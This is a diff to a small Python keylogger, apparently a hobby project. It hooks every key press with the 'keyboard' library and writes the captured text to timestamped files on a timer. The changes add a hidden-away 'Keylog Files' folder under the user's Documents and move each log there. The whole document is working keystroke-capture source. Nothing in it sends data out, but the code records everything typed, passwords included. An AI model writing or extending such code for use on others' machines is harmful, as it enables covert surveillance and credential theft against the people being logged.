@@ -1,4 +1,6 @@
 import keyboard
+import os
+import pathlib
 from threading import Timer
 from datetime import datetime
 
@@ -12,9 +14,10 @@ class Keylog:
         "SPACE": " ",
         "ENTER": "\n",
         }
+        self.logPath = pathlib.Path.home().drive + "\\Users\\" + os.getlogin() + "\\Documents\\Keylog Files"
 
     def report(self, letter):
-        newLetter = letter.name.upper()
+        newLetter = letter.name
         if len(newLetter) > 1:
             if newLetter in self.specialCharacters:
                 newLetter = self.specialCharacters[newLetter]
@@ -29,6 +32,8 @@ class Keylog:
             date = date.replace('-','_').replace(':', '-')
             with open(f"KEYLOG {date}.txt","w") as F:
                 print(self.session, file=F)
+            os.rename(f"KEYLOG {date}.txt",f"{self.logPath}\\KEYLOG {date}.txt")
+            
         self.session = ""
         self.startDate = datetime.now()
         time = Timer(interval=self.rate, function=self.updateFile)
@@ -37,6 +42,10 @@ class Keylog:
 
     def start(self):
         self.startDate = datetime.now()
+        if not os.path.exists(self.logPath):
+            os.makedirs(self.logPath)
+            print("true")
+        print(self.logPath)
         keyboard.on_press(callback=self.report)
         self.updateFile()
         keyboard.wait('ctrl+alt+0')
